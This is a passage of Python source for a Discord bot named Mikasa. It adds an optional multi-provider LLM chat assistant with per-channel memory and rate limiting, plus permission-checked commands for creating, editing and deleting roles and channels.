        try:
            await message.reply(text[:1900], mention_author=False)
        except Exception:
            try:
                await channel.send(text[:1900])
            except Exception:
                pass

    # Empty query → short greeting (no example spam)
    if not query:
        await _say(f"Hey {name}! How can I help you?")
        return

    matches = _ai_score_query(query)
    low = query.lower()

    # Greeting / smalltalk — warm, plain, no command examples
    if any(w in low for w in ("hi", "hello", "hey", "yo", "sup", "how are you", "who are you")):
        await _say(f"Hey {name}! I'm {BOT_NAME}. How can I help you?")
        return

    if matches and matches[0][0] >= 20:
        # Natural sentence about the command match instead of a bullet dump
        top = matches[0]
        usage, desc = top[2], top[3]
        extra = ""
        if len(matches) > 1:
            extra = " Related: " + ", ".join(m[2] for m in matches[1:3]) + "."
        await _say(
            f"Hey {name}, for that you'll want `{usage}` — {desc}.{extra}"
        )
        return

    # Soft fallback when no LLM is configured — still natural, no example list
    await _say(
        f"Hey {name}, I'm not sure about that one. "
        f"Ask me again in a different way, or use `{PREFIX}help` if you need the command list."
    )


@bot.command(name="ask", aliases=["ai", "assistant", "chat", "chatgpt", "grok", "claude", "deepseek"])
async def mikasa_ask_cmd(ctx, *, question: str = None):
    """Ask Mikasa anything — general Q&A (when an AI API key is set) plus bot command help."""
    # Guard against accidental double-handling of the same message
    if getattr(ctx.message, "_mikasa_ai_handled", False):
        return
    try:
        ctx.message._mikasa_ai_handled = True
    except Exception:
        pass
    await _ai_respond(ctx.message, question or "")


# ── Multi-provider AI chatbot (optional; falls back to command matcher) ─────
# Set any of these environment variables on Railway / host:
#   OPENAI_API_KEY, GROQ_API_KEY, OPENROUTER_API_KEY, ANTHROPIC_API_KEY, XAI_API_KEY
# Optional: MIKASA_AI_PROVIDER = openai | groq | openrouter | anthropic | xai | auto
# Optional: MIKASA_AI_MODEL overrides the default model for the chosen provider.

_MIKASA_AI_HISTORY: dict = {}  # channel_id -> list[{role, content}]
_MIKASA_AI_HISTORY_LIMIT = 8
_MIKASA_AI_COOLDOWN: dict = {}  # user_id -> timestamp
_MIKASA_AI_COOLDOWN_SECS = 3

def _mikasa_ai_providers_available() -> list:
    """Return configured provider ids in preference order."""
    order = []
    pref = (os.environ.get("MIKASA_AI_PROVIDER") or "auto").strip().lower()
    mapping = [
        ("groq", "GROQ_API_KEY"),
        ("openai", "OPENAI_API_KEY"),
        ("openrouter", "OPENROUTER_API_KEY"),
        ("anthropic", "ANTHROPIC_API_KEY"),
        ("xai", "XAI_API_KEY"),
    ]
    available = {name: bool((os.environ.get(env) or "").strip()) for name, env in mapping}
    if pref != "auto" and available.get(pref):
        return [pref]
    # Prefer fast/cheap free-tier first, then broader models
    for name, _env in mapping:
        if available.get(name):
            order.append(name)
    return order


def _mikasa_ai_command_context(query: str = "") -> str:
    """System prompt: natural chatbot personality + bot command knowledge."""
    matches = []
    try:
        scored = _ai_score_query(query) if query else []
        for score, name, usage, desc in scored[:8]:
            matches.append(f"- {usage}: {desc}")
    except Exception:
        pass
    overview = []
    try:
        for key, cat in list(HELP_CATEGORIES.items())[:14]:
            title = cat.get("title") or key
            n = len(cat.get("cmds") or [])
            overview.append(f"{title} ({n})")
    except Exception:
        pass
    parts = [
        f"You are {BOT_NAME}, a warm, caring Discord chatbot — like a close friend who explains things clearly.",
        "Reply in plain chat text only. Never use markdown embeds, titles, bullet lists of examples, or robotic templates.",
        "Style: natural full sentences, a little affectionate and personal (similar to calling someone 'my honey' when it fits), calm and helpful.",
        "Answer general knowledge, school/study questions, science, definitions, and casual chat directly.",
        "Do not say 'Not sure about X. Try ,help or ask like: how do I ban a user'. Just answer the question or admit you don't know in a natural way.",
        f"You also know this bot's commands (prefix `{PREFIX}`). If the user asks about a bot command or feature:",
        "- Explain it simply in one or two sentences and give the exact usage once.",
        "- If it does not exist, say so honestly and suggest the closest real command once.",
        "Do not invent commands. Never reveal tokens, API keys, or private owner data.",
        "Keep answers readable in Discord (usually under ~1200 characters unless more detail is needed).",
        f"Command categories available: {', '.join(overview) if overview else 'see help'}.",
    ]
    if matches:
        parts.append("Likely relevant commands for this message:\n" + "\n".join(matches))
    else:
        parts.append(f"Users can open the menu with `{PREFIX}help` anytime.")
    return "\n".join(parts)



async def _mikasa_ai_call_openai_compatible(
    *,
    base_url: str,
    api_key: str,
    model: str,
    system: str,
    messages: list,
    timeout: float = 45.0,
) -> str:
    headers = {
        "Authorization": f"Bearer {api_key}",
        "Content-Type": "application/json",
    }
    # OpenRouter recommends identifying the app
    if "openrouter" in base_url:
        headers["HTTP-Referer"] = "https://github.com/mikasa-bot"
        headers["X-Title"] = BOT_NAME
    payload = {
        "model": model,
        "messages": [{"role": "system", "content": system}] + messages,
        "temperature": 0.7,
        "max_tokens": 900,
    }
    async with aiohttp.ClientSession() as session:
        async with session.post(
            f"{base_url.rstrip('/')}/chat/completions",
            headers=headers,
            json=payload,
            timeout=aiohttp.ClientTimeout(total=timeout),
        ) as resp:
            data = await resp.json(content_type=None)
            if resp.status >= 400:
                err = data.get("error", data) if isinstance(data, dict) else data
                raise RuntimeError(f"HTTP {resp.status}: {err}")
            return (
                data.get("choices", [{}])[0]
                .get("message", {})
                .get("content", "")
                .strip()
            )


async def _mikasa_ai_call_anthropic(api_key: str, model: str, system: str, messages: list) -> str:
    headers = {
        "x-api-key": api_key,
        "anthropic-version": "2023-06-01",
        "Content-Type": "application/json",
    }
    # Anthropic expects alternating user/assistant; strip system from messages
    payload = {
        "model": model,
        "max_tokens": 900,
        "system": system,
        "messages": messages,
    }
    async with aiohttp.ClientSession() as session:
        async with session.post(
            "https://api.anthropic.com/v1/messages",
            headers=headers,
            json=payload,
            timeout=aiohttp.ClientTimeout(total=45),
        ) as resp:
            data = await resp.json(content_type=None)
            if resp.status >= 400:
                raise RuntimeError(f"HTTP {resp.status}: {data}")
            blocks = data.get("content") or []
            texts = [b.get("text", "") for b in blocks if isinstance(b, dict) and b.get("type") == "text"]
            return "\n".join(texts).strip()


async def _mikasa_ai_generate(query: str, channel_id: int = 0) -> tuple:
    """
    Try configured LLM providers. Returns (text, provider_label) or (None, None).
    """
    providers = _mikasa_ai_providers_available()
    if not providers:
        return None, None

    system = _mikasa_ai_command_context(query)
    history = list(_MIKASA_AI_HISTORY.get(channel_id, []))
    messages = history + [{"role": "user", "content": query[:2000]}]

    model_overrides = {
        "groq": os.environ.get("MIKASA_AI_MODEL") or "llama-3.3-70b-versatile",
        "openai": os.environ.get("MIKASA_AI_MODEL") or "gpt-4o-mini",
        "openrouter": os.environ.get("MIKASA_AI_MODEL") or "openai/gpt-4o-mini",
        "anthropic": os.environ.get("MIKASA_AI_MODEL") or "claude-3-5-haiku-latest",
        "xai": os.environ.get("MIKASA_AI_MODEL") or "grok-2-latest",
    }
    endpoints = {
        "groq": ("https://api.groq.com/openai/v1", "GROQ_API_KEY"),
        "openai": ("https://api.openai.com/v1", "OPENAI_API_KEY"),
        "openrouter": ("https://openrouter.ai/api/v1", "OPENROUTER_API_KEY"),
        "xai": ("https://api.x.ai/v1", "XAI_API_KEY"),
    }
    labels = {
        "groq": "Groq",
        "openai": "ChatGPT",
        "openrouter": "OpenRouter",
        "anthropic": "Claude",
        "xai": "Grok",
    }

    last_err = None
    for provider in providers:
        try:
            if provider == "anthropic":
                key = (os.environ.get("ANTHROPIC_API_KEY") or "").strip()
                if not key:
                    continue
                text = await _mikasa_ai_call_anthropic(key, model_overrides["anthropic"], system, messages)
            else:
                base, env_name = endpoints[provider]
                key = (os.environ.get(env_name) or "").strip()
                if not key:
                    continue
                text = await _mikasa_ai_call_openai_compatible(
                    base_url=base,
                    api_key=key,
                    model=model_overrides[provider],
                    system=system,
                    messages=messages,
                )
            if text:
                # Update short channel memory
                hist = _MIKASA_AI_HISTORY.setdefault(channel_id, [])
                hist.append({"role": "user", "content": query[:2000]})
                hist.append({"role": "assistant", "content": text[:3000]})
                if len(hist) > _MIKASA_AI_HISTORY_LIMIT * 2:
                    del hist[: len(hist) - _MIKASA_AI_HISTORY_LIMIT * 2]
                return text, labels.get(provider, provider)
        except Exception as ex:
            last_err = ex
            print(f"[Mikasa AI] {provider} failed: {ex}")
            continue
    if last_err:
        print(f"[Mikasa AI] all providers failed: {last_err}")
    return None, None


# Patch _ai_respond to use LLM when available, while keeping command matching.
_ORIGINAL_AI_RESPOND = _ai_respond

async def _ai_respond(message: discord.Message, query: str):
    """AI assistant: real LLM (if API keys set) + built-in command help fallback.
    Always plain text (Nevil-style). Guard prevents double replies on the same message.
    """
    # Hard guard: one reply path per message object
    if getattr(message, "_mikasa_ai_replied", False):
        return
    try:
        message._mikasa_ai_replied = True
    except Exception:
        pass

    query = (query or "").strip()
    channel = message.channel
    author = message.author
    name = getattr(author, "display_name", None) or getattr(author, "name", "friend")

    if not query:
        try:
            await message.reply(f"Hey {name}! How can I help you?", mention_author=False)
        except Exception:
            try:
                await channel.send(f"Hey {name}! How can I help you?")
            except Exception:
                pass
        return

    # Light rate limit per user
    try:
        uid = int(getattr(author, "id", 0) or 0)
        now = time.time()
        last = float(_MIKASA_AI_COOLDOWN.get(uid, 0) or 0)
        if now - last < _MIKASA_AI_COOLDOWN_SECS and uid != OWNER_ID:
            try:
                await channel.send("⏳ Give me a moment — try again in a few seconds.")
            except Exception:
                pass
            return
        _MIKASA_AI_COOLDOWN[uid] = now
    except Exception:
        pass

    # Prefer LLM when configured
    providers = _mikasa_ai_providers_available()
    if providers:
        # Typing indicator while waiting
        try:
            async with channel.typing():
                answer, label = await _mikasa_ai_generate(query, getattr(channel, "id", 0) or 0)
        except Exception:
            answer, label = await _mikasa_ai_generate(query, getattr(channel, "id", 0) or 0)
        if answer:
            # Plain chat text only (Nevil-style) — never wrap in embeds
            chunks = []
            body = answer.strip()
            while body:
                chunks.append(body[:1900])
                body = body[1900:]
            try:
                for i, chunk in enumerate(chunks[:4]):
                    if i == 0:
                        try:
                            await message.reply(chunk, mention_author=False)
                        except Exception:
                            await channel.send(chunk)
                    else:
                        await channel.send(chunk)
            except Exception:
                try:
                    await channel.send(chunks[0][:1900])
                except Exception:
                    pass
            return
        # If LLM failed, fall through to local matcher

    # Local command matcher / smalltalk (original behaviour) — still plain text
    # Clear the replied flag so the original helper can still send once
    try:
        message._mikasa_ai_replied = False
    except Exception:
        pass
    await _ORIGINAL_AI_RESPOND(message, query)


@bot.hybrid_command(name="aistatus", aliases=["aiproviders", "chatstatus"], description="Show which AI providers are configured")
async def aistatus_cmd(ctx: commands.Context):
    """Show AI chatbot configuration status (does not reveal keys)."""
    providers = _mikasa_ai_providers_available()
    lines = [
        f"**Preferred provider env:** `{(os.environ.get('MIKASA_AI_PROVIDER') or 'auto')}`",
        f"**Model override:** `{(os.environ.get('MIKASA_AI_MODEL') or 'default per provider')}`",
        "",
        "**Keys detected:**",
        f"• Groq (fast): {'✅' if os.environ.get('GROQ_API_KEY') else '❌'}",
        f"• OpenAI (ChatGPT): {'✅' if os.environ.get('OPENAI_API_KEY') else '❌'}",
        f"• OpenRouter (Claude/DeepSeek/others): {'✅' if os.environ.get('OPENROUTER_API_KEY') else '❌'}",
        f"• Anthropic (Claude): {'✅' if os.environ.get('ANTHROPIC_API_KEY') else '❌'}",
        f"• xAI (Grok): {'✅' if os.environ.get('XAI_API_KEY') else '❌'}",
        "",
        f"**Active order:** {', '.join(providers) if providers else 'none — using built-in command helper only'}",
        "",
        f"Chat with `{PREFIX}ask <question>`, `{PREFIX}ai <question>`, or mention the bot.",
    ]
    await ctx.send(embed=discord.Embed(
        title="🤖 AI Assistant Status",
        description="\n".join(lines),
        color=COLORS.get("info", 0x5865F2),
    ))


@bot.command(name="aiclean", aliases=["clearchat", "resetai"])
async def aiclean_cmd(ctx: commands.Context):
    """Clear short AI chat memory for this channel."""
    cid = getattr(ctx.channel, "id", 0)
    _MIKASA_AI_HISTORY.pop(cid, None)
    await ctx.send(embed=discord.Embed(
        description="🧹 Cleared AI conversation memory for this channel.",
        color=COLORS["success"],
    ))


# ── Role command (admin / manage_roles) ──────────────────────────────────
def _resolve_role_by_name(guild: discord.Guild, query: str):
    """Resolve a role from mention, ID, or name (supports spaces). Returns (role|None, error|None)."""
    if not guild or not query:
        return None, "❌ Provide a role name, mention, or ID."
    q = query.strip()
    # Mention <@&id>
    if q.startswith("<@&") and q.endswith(">"):
        try:
            rid = int(q[3:-1])
            role = guild.get_role(rid)
            if role:
                return role, None
            return None, f"❌ Role ID `{rid}` not found in this server."
        except ValueError:
            pass
    # Raw ID
    if q.isdigit():
        role = guild.get_role(int(q))
        if role:
            return role, None
        return None, f"❌ Role ID `{q}` not found in this server."
    # Exact name (case-insensitive), then partial
    lowered = q.lower()
    exact = [r for r in guild.roles if r.name.lower() == lowered and not r.is_default()]
    if len(exact) == 1:
        return exact[0], None
    if len(exact) > 1:
        listing = ", ".join(f"`{r.name}` ({r.id})" for r in exact[:8])
        return None, f"❌ Multiple roles named **{q}**. Be more specific or use the role ID:\n{listing}"
    partial = [r for r in guild.roles if lowered in r.name.lower() and not r.is_default()]
    if len(partial) == 1:
        return partial[0], None
    if len(partial) > 1:
        listing = ", ".join(f"`{r.name}` ({r.id})" for r in partial[:8])
        return None, f"❌ Multiple roles match **{q}**. Be more specific or use the role ID:\n{listing}"
    return None, f"❌ No role found matching **{q}**."


@bot.hybrid_command(name="role", description="Add or remove a role from a member (name, mention, or ID)")
@app_commands.describe(member="Member", role="Role name, mention, or ID (spaces allowed)")
async def role_cmd(ctx: commands.Context, member: discord.Member, *, role: str):
    """Toggle a role on a member. Accepts role name (with spaces), mention, or ID."""
    if not ctx.guild:
        return await ctx.send(embed=discord.Embed(description="❌ Server only.", color=COLORS["error"]))

    author = ctx.author
    can = (
        has_owner_access(author)
        or author.id == ctx.guild.owner_id
        or getattr(author.guild_permissions, "administrator", False)
        or getattr(author.guild_permissions, "manage_roles", False)
        or is_staff(author)
    )
    if not can:
        return await ctx.send(embed=discord.Embed(
            description="❌ You need **Manage Roles** or **Administrator**.",
            color=COLORS["error"],
        ))

    role_obj, err = _resolve_role_by_name(ctx.guild, role)
    if err:
        return await ctx.send(embed=discord.Embed(description=err, color=COLORS["error"]))
    role = role_obj

    ok, err = can_assign_role(author, role)
    if not ok:
        return await ctx.send(embed=discord.Embed(description=err, color=COLORS["error"]))

    # Bot hierarchy
    me = ctx.guild.me
    if me and role >= me.top_role:
        return await ctx.send(embed=discord.Embed(
            description=f"❌ I can't manage {role.mention} — move my role **above** it.",
            color=COLORS["error"],
        ))

    try:
        if role in member.roles:
            await member.remove_roles(role, reason=f"role toggle by {author}")
            await ctx.send(embed=discord.Embed(
                description=f"✅ Removed {role.mention} from **{member.display_name}**.",
                color=COLORS["success"],
            ))
        else:
            await member.add_roles(role, reason=f"role toggle by {author}")
            await ctx.send(embed=discord.Embed(
                description=f"✅ Gave {role.mention} to **{member.display_name}**.",
                color=COLORS["success"],
            ))
    except discord.Forbidden:
        await ctx.send(embed=discord.Embed(
            description="❌ Missing permissions — put my role higher and ensure I have **Manage Roles**.",
            color=COLORS["error"],
        ))
    except Exception as ex:
        await ctx.send(embed=discord.Embed(description=f"❌ {ex}", color=COLORS["error"]))


def _parse_color(raw: str) -> int:
    """Parse #hex, hex, or common color name → int 0xRRGGBB."""
    if not raw:
        return 0
    s = raw.strip().lower()
    named = {
        "red": 0xED4245, "blue": 0x3498DB, "green": 0x57F287, "gold": 0xF1C40F,
        "yellow": 0xFEE75C, "purple": 0x9B59B6, "orange": 0xE67E22, "teal": 0x1ABC9C,
        "white": 0xFFFFFF, "black": 0x000000, "pink": 0xEB459E, "blurple": 0x5865F2,
        "grey": 0x95A5A6, "gray": 0x95A5A6, "cyan": 0x1ABC9C, "random": -1,
    }
    if s == "random":
        import random as _rnd
        return _rnd.randint(0, 0xFFFFFF)
    if s in named:
        return named[s]
    hx = s.lstrip("#")
    try:
        return int(hx, 16) & 0xFFFFFF
    except Exception:
        return 0


def _can_manage_roles_check(author, guild) -> tuple:
    if not guild:
        return False, "❌ Server only."
    if (
        has_owner_access(author)
        or author.id == guild.owner_id
        or getattr(author.guild_permissions, "administrator", False)
        or getattr(author.guild_permissions, "manage_roles", False)
    ):
        return True, ""
    return False, "❌ Need **Manage Roles** or **Administrator**."


def _can_manage_channels_check(author, guild) -> tuple:
    if not guild:
        return False, "❌ Server only."
    if (
        has_owner_access(author)
        or author.id == guild.owner_id
        or getattr(author.guild_permissions, "administrator", False)
        or getattr(author.guild_permissions, "manage_channels", False)
    ):
        return True, ""
    return False, "❌ Need **Manage Channels** or **Administrator**."


# ── Role management ──────────────────────────────────────────────────────

@bot.hybrid_command(name="createrole", aliases=["makerole", "newrole"], description="Create a new role")
@app_commands.describe(name="Role name", color="Hex (#FF0000) or name (red, blue, blurple…)", hoist="Show members separately", mentionable="Allow @mention")
async def createrole_cmd(
    ctx: commands.Context,
    name: str,
    color: str = "blurple",
    hoist: bool = False,
    mentionable: bool = False,
):
    ok, err = _can_manage_roles_check(ctx.author, ctx.guild)
    if not ok:
        return await ctx.send(embed=discord.Embed(description=err, color=COLORS["error"]))
    name = (name or "").strip()[:100]
    if not name:
        return await ctx.send(embed=discord.Embed(description="❌ Provide a role name.", color=COLORS["error"]))
    color_val = _parse_color(color)
    try:
        role = await ctx.guild.create_role(
            name=name,
            color=discord.Color(color_val),
            hoist=hoist,
            mentionable=mentionable,
            reason=f"createrole by {ctx.author}",
        )
        await ctx.send(embed=discord.Embed(
            title="✅ Role Created",
            description=(
                f"{role.mention}\n"
                f"**Name:** {role.name}\n"
                f"**Color:** `#{color_val:06X}`\n"
                f"**Hoist:** {hoist} · **Mentionable:** {mentionable}"
            ),
            color=color_val or COLORS["success"],
        ))
    except discord.Forbidden:
        await ctx.send(embed=discord.Embed(
            description="❌ Missing **Manage Roles** — put my role higher in the list.",
            color=COLORS["error"],
        ))
    except Exception as ex:
        await ctx.send(embed=discord.Embed(description=f"❌ {ex}", color=COLORS["error"]))


@bot.hybrid_command(name="editcolor", aliases=["rolecolor", "setrolecolor"], description="Change a role's color (hex or name)")
@app_commands.describe(role="Role name, mention, or ID", color="Hex code like #FF0000 or a color name")
async def editcolor_cmd(ctx: commands.Context, role: str, *, color: str):
    """Change only the color of a role. Supports role names with spaces."""
    ok, err = _can_manage_roles_check(ctx.author, ctx.guild)
    if not ok:
        return await ctx.send(embed=discord.Embed(description=err, color=COLORS["error"]))
    role_obj, rerr = _resolve_role_by_name(ctx.guild, role)
    if rerr:
        return await ctx.send(embed=discord.Embed(description=rerr, color=COLORS["error"]))
    role = role_obj
    if role.is_default():
        return await ctx.send(embed=discord.Embed(description="❌ Cannot edit @everyone this way.", color=COLORS["error"]))
    if role.managed:
        return await ctx.send(embed=discord.Embed(description="❌ Cannot edit **managed/bot** integration roles.", color=COLORS["error"]))
    me = ctx.guild.me
    if me and role >= me.top_role and not has_owner_access(ctx.author):
        return await ctx.send(embed=discord.Embed(description="❌ My role must be **above** that role.", color=COLORS["error"]))
    if not has_owner_access(ctx.author) and ctx.author.id != ctx.guild.owner_id and role >= ctx.author.top_role:
        return await ctx.send(embed=discord.Embed(description="❌ That role is equal/higher than yours.", color=COLORS["error"]))
    if not color or not color.strip():
        return await ctx.send(embed=discord.Embed(description="❌ Provide a color, e.g. `,editcolor Mod #FF0000` or `,editcolor Mod red`.", color=COLORS["error"]))
    cval = _parse_color(color)
    try:
        await role.edit(color=discord.Color(cval), reason=f"editcolor by {ctx.author}")
        await ctx.send(embed=discord.Embed(
            title="✅ Role Color Updated",
            description=f"{role.mention}\n**Color** → `#{cval:06X}`",
            color=cval,
        ))
    except discord.Forbidden:
        await ctx.send(embed=discord.Embed(description="❌ Discord denied the edit (hierarchy/permissions).", color=COLORS["error"]))
    except Exception as ex:
        await ctx.send(embed=discord.Embed(description=f"❌ {ex}", color=COLORS["error"]))


@bot.hybrid_command(name="editname", aliases=["rolename", "setrolename", "renamerole"], description="Change a role's name")
@app_commands.describe(role="Current role name, mention, or ID", new_name="New name for the role")
async def editname_cmd(ctx: commands.Context, role: str, *, new_name: str):
    """Change only the name of a role. Supports role names with spaces."""
    ok, err = _can_manage_roles_check(ctx.author, ctx.guild)
    if not ok:
        return await ctx.send(embed=discord.Embed(description=err, color=COLORS["error"]))
    role_obj, rerr = _resolve_role_by_name(ctx.guild, role)
    if rerr:
        return await ctx.send(embed=discord.Embed(description=rerr, color=COLORS["error"]))
    role = role_obj
    if role.is_default():
        return await ctx.send(embed=discord.Embed(description="❌ Cannot edit @everyone this way.", color=COLORS["error"]))
    if role.managed:
        return await ctx.send(embed=discord.Embed(description="❌ Cannot edit **managed/bot** integration roles.", color=COLORS["error"]))
    me = ctx.guild.me
    if me and role >= me.top_role and not has_owner_access(ctx.author):
        return await ctx.send(embed=discord.Embed(description="❌ My role must be **above** that role.", color=COLORS["error"]))
    if not has_owner_access(ctx.author) and ctx.author.id != ctx.guild.owner_id and role >= ctx.author.top_role:
        return await ctx.send(embed=discord.Embed(description="❌ That role is equal/higher than yours.", color=COLORS["error"]))
    new_name = (new_name or "").strip()[:100]
    if not new_name:
        return await ctx.send(embed=discord.Embed(description="❌ Provide a new name, e.g. `,editname Old Name New Name`.", color=COLORS["error"]))
    old_name = role.name
    try:
        await role.edit(name=new_name, reason=f"editname by {ctx.author}")
        await ctx.send(embed=discord.Embed(
            title="✅ Role Name Updated",
            description=f"{role.mention}\n**Name** → `{old_name}` → `{new_name}`",
            color=role.color.value if role.color else COLORS["success"],
        ))
    except discord.Forbidden:
        await ctx.send(embed=discord.Embed(description="❌ Discord denied the edit (hierarchy/permissions).", color=COLORS["error"]))
    except Exception as ex:
        await ctx.send(embed=discord.Embed(description=f"❌ {ex}", color=COLORS["error"]))


# Keep editrole as a thin compatibility wrapper
@bot.hybrid_command(name="editrole", aliases=["roleedit", "modifyrole"], description="Edit a role name and/or color (prefer ,editname / ,editcolor)")
@app_commands.describe(role="Role to edit", name="New name (leave empty to keep)", color="New color hex/name (leave empty to keep)")
async def editrole_cmd(
    ctx: commands.Context,
    role: str,
    name: str = None,
    color: str = None,
):
    ok, err = _can_manage_roles_check(ctx.author, ctx.guild)
    if not ok:
        return await ctx.send(embed=discord.Embed(description=err, color=COLORS["error"]))
    role_obj, rerr = _resolve_role_by_name(ctx.guild, role if isinstance(role, str) else getattr(role, "name", str(role)))
    if rerr:
        return await ctx.send(embed=discord.Embed(description=rerr, color=COLORS["error"]))
    role = role_obj
    if role.is_default():
        return await ctx.send(embed=discord.Embed(description="❌ Cannot edit @everyone this way.", color=COLORS["error"]))
    if role.managed:
        return await ctx.send(embed=discord.Embed(description="❌ Cannot edit **managed/bot** integration roles.", color=COLORS["error"]))
    me = ctx.guild.me
    if me and role >= me.top_role and not has_owner_access(ctx.author):
        return await ctx.send(embed=discord.Embed(description="❌ My role must be **above** that role.", color=COLORS["error"]))
    if not has_owner_access(ctx.author) and ctx.author.id != ctx.guild.owner_id and role >= ctx.author.top_role:
        return await ctx.send(embed=discord.Embed(description="❌ That role is equal/higher than yours.", color=COLORS["error"]))

    kwargs = {"reason": f"editrole by {ctx.author}"}
    changes = []
    if name and name.strip():
        kwargs["name"] = name.strip()[:100]
        changes.append(f"**Name** → `{kwargs['name']}`")
    if color and color.strip():
        cval = _parse_color(color)
        kwargs["color"] = discord.Color(cval)
        changes.append(f"**Color** → `#{cval:06X}`")
    if len(kwargs) == 1:
        return await ctx.send(embed=discord.Embed(
            description="❌ Provide `name:` and/or `color:` to change.\nPrefer: `,editname Role New Name` or `,editcolor Role #FF0000`",
            color=COLORS["error"],
        ))
    try:
        await role.edit(**kwargs)
        await ctx.send(embed=discord.Embed(
            title="✅ Role Updated",
            description=f"{role.mention}\n" + "\n".join(changes),
            color=kwargs.get("color", role.color).value if hasattr(kwargs.get("color", role.color), "value") else role.color.value,
        ))
    except discord.Forbidden:
        await ctx.send(embed=discord.Embed(description="❌ Discord denied the edit (hierarchy/permissions).", color=COLORS["error"]))
    except Exception as ex:
        await ctx.send(embed=discord.Embed(description=f"❌ {ex}", color=COLORS["error"]))


@bot.hybrid_command(name="deleterole", aliases=["removerole", "delrole"], description="Delete a role")
@app_commands.describe(role="Role to delete")
async def deleterole_cmd(ctx: commands.Context, role: discord.Role):
    ok, err = _can_manage_roles_check(ctx.author, ctx.guild)
    if not ok:
        return await ctx.send(embed=discord.Embed(description=err, color=COLORS["error"]))
    if role.is_default():
        return await ctx.send(embed=discord.Embed(description="❌ Cannot delete @everyone.", color=COLORS["error"]))
    if role.managed:
        return await ctx.send(embed=discord.Embed(description="❌ Cannot delete **managed/bot** roles.", color=COLORS["error"]))
    me = ctx.guild.me
    if me and role >= me.top_role and ctx.author.id != OWNER_ID:
        return await ctx.send(embed=discord.Embed(description="❌ My role must be **above** that role.", color=COLORS["error"]))
    if ctx.author.id not in (OWNER_ID, ctx.guild.owner_id) and role >= ctx.author.top_role:
        return await ctx.send(embed=discord.Embed(description="❌ That role is equal/higher than yours.", color=COLORS["error"]))
    rname = role.name
    try:
        await role.delete(reason=f"deleterole by {ctx.author}")
        await ctx.send(embed=discord.Embed(
            description=f"🗑️ Deleted role **{rname}**.",
            color=COLORS["success"],
        ))
    except discord.Forbidden:
        await ctx.send(embed=discord.Embed(description="❌ Discord denied the delete.", color=COLORS["error"]))
    except Exception as ex:
        await ctx.send(embed=discord.Embed(description=f"❌ {ex}", color=COLORS["error"]))


# ── Channel management ───────────────────────────────────────────────────

@bot.hybrid_command(name="createchannel", aliases=["makechannel", "newchannel", "createchan"], description="Create a text or voice channel")
@app_commands.describe(
    name="Channel name",
    channel_type="text or voice",
    category="Optional category to put it in",
)
async def createchannel_cmd(
    ctx: commands.Context,
    name: str,
    channel_type: str = "text",
    category: discord.CategoryChannel = None,
):
    ok, err = _can_manage_channels_check(ctx.author, ctx.guild)
    if not ok:
        return await ctx.send(embed=discord.Embed(description=err, color=COLORS["error"]))
    name = (name or "").strip().replace(" ", "-")[:100]
    if not name:
        return await ctx.send(embed=discord.Embed(description="❌ Provide a channel name.", color=COLORS["error"]))
    ctype = (channel_type or "text").strip().lower()
    try:
        if ctype in ("voice", "vc", "v"):
            ch = await ctx.guild.create_voice_channel(
                name, category=category, reason=f"createchannel by {ctx.author}"
            )
        else:
            ch = await ctx.guild.create_text_channel(
                name, category=category, reason=f"createchannel by {ctx.author}"
            )
        cat_txt = f" in {category.mention}" if category else ""
        await ctx.send(embed=discord.Embed(
            title="✅ Channel Created",
            description=f"{ch.mention}{cat_txt}\n**Type:** {ctype}",
            color=COLORS["success"],
        ))
    except discord.Forbidden:
        await ctx.send(embed=discord.Embed(
            description="❌ Missing **Manage Channels** permission.",
            color=COLORS["error"],
        ))
    except Exception as ex:
        await ctx.send(embed=discord.Embed(description=f"❌ {ex}", color=COLORS["error"]))


@bot.hybrid_command(name="editchannel", aliases=["channeledit", "renamechannel"], description="Edit channel name and/or move into a category")
@app_commands.describe(
    channel="Channel to edit (defaults to current)",
    name="New channel name (optional)",
    category="Category to move into (optional)",
)
async def editchannel_cmd(
    ctx: commands.Context,
    channel: discord.abc.GuildChannel = None,
    name: str = None,
    category: discord.CategoryChannel = None,
):
    ok, err = _can_manage_channels_check(ctx.author, ctx.guild)
    if not ok:
        return await ctx.send(embed=discord.Embed(description=err, color=COLORS["error"]))
    ch = channel or ctx.channel
    if not isinstance(ch, (discord.TextChannel, discord.VoiceChannel, discord.StageChannel, discord.ForumChannel)):
        return await ctx.send(embed=discord.Embed(description="❌ That channel type cannot be edited this way.", color=COLORS["error"]))
    kwargs = {"reason": f"editchannel by {ctx.author}"}
    changes = []
    if name and name.strip():
        kwargs["name"] = name.strip().replace(" ", "-")[:100]
        changes.append(f"**Name** → `{kwargs['name']}`")
    # category: only set if provided. Use a sentinel? Discord allows category=None to remove.
    # For hybrid, if user doesn't pass category it stays None — don't clear unless explicit.
    # We'll only move when category is provided.
    if category is not None:
        kwargs["category"] = category
        changes.append(f"**Category** → {category.mention}")
    if len(kwargs) == 1:
        return await ctx.send(embed=discord.Embed(
            description=(
                "❌ Provide `name:` and/or `category:`.\n"
                "Examples:\n"
                "`,editchannel name:general`\n"
                "`,editchannel category:#Info`\n"
                "`,editchannel #chat name:lobby category:#Community`"
            ),
            color=COLORS["error"],
        ))
    try:
        await ch.edit(**kwargs)
        await ctx.send(embed=discord.Embed(
            title="✅ Channel Updated",
            description=f"{ch.mention}\n" + "\n".join(changes),
            color=COLORS["success"],
        ))
    except discord.Forbidden:
        await ctx.send(embed=discord.Embed(description="❌ Discord denied the edit.", color=COLORS["error"]))
    except Exception as ex:
        await ctx.send(embed=discord.Embed(description=f"❌ {ex}", color=COLORS["error"]))


@bot.hybrid_command(name="deletechannel", aliases=["delchannel", "removechannel"], description="Delete a channel")
@app_commands.describe(channel="Channel to delete (defaults to current)")
async def deletechannel_cmd(ctx: commands.Context, channel: discord.abc.GuildChannel = None):
    ok, err = _can_manage_channels_check(ctx.author, ctx.guild)
    if not ok:
        return await ctx.send(embed=discord.Embed(description=err, color=COLORS["error"]))
    ch = channel or ctx.channel
    if isinstance(ch, discord.CategoryChannel):
        return await ctx.send(embed=discord.Embed(
            description="❌ Use a channel, not a category. (Deleting categories can wipe nested channels.)",
            color=COLORS["error"],
        ))
    cname = getattr(ch, "name", str(ch.id))
    try:
        await ch.delete(reason=f"deletechannel by {ctx.author}")
        # If we deleted the current channel, try not to send there
        try:
            await ctx.send(embed=discord.Embed(description=f"🗑️ Deleted **#{cname}**.", color=COLORS["success"]))
        except Exception:
            pass
    except discord.Forbidden:
        await ctx.send(embed=discord.Embed(description="❌ Discord denied the delete.", color=COLORS["error"]))
    except Exception as ex:
        try:
            await ctx.send(embed=discord.Embed(description=f"❌ {ex}", color=COLORS["error"]))
        except Exception:
            pass


